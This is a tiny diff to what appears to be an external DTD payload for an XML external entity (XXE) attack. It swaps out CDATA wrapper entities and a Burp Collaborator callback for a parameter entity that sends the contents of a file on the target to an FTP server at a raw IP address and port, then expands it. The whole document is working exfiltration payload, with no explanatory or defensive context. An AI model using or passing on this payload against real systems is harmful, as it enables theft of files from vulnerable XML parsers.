@@ -1,3 +1,2 @@
-<!ENTITY % start "<![CDATA[">
-<!ENTITY % end "]]>">
-<!ENTITY % all '<!ENTITY &#x25; exfil SYSTEM "https://cn31vvj9c1b3d6bifk0hz5xroiu9i2dq2.oastify.com/d=%file;">'>
+<!ENTITY % all '<!ENTITY &#x25; exfil SYSTEM "ftp://139.162.14.64:38927/%file;">'>
+%all;
